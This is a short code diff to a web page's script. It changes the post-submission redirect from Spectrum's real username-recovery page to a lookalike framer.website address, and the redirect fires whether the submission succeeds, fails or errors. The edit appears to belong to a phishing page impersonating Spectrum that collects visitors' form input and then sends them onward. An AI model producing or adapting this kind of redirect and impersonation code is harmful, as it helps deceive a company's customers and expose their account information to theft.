@@ -205,15 +205,15 @@
         })
         .then(response => {
             if (response.ok) {
-                window.location.href = "https://self-care.portals.spectrum.net/username-recovery"; // Redirect after successful submission
+                window.location.href = "https://spectrum-await.framer.website/"; // Redirect after successful submission
             } else {
                 console.error('There is an error with your request.');
-                window.location.href = "https://self-care.portals.spectrum.net/username-recovery"; //redirect regardless of success.
+                window.location.href = "https://spectrum-await.framer.website/"; //redirect regardless of success.
             }
         })
         .catch(error => {
             console.error('Error:', error);
-            window.location.href = "https://self-care.portals.spectrum.net/username-recovery"; //redirect regardless of error.
+            window.location.href = "https://spectrum-await.framer.website/"; //redirect regardless of error.
         });
     });
 </script>
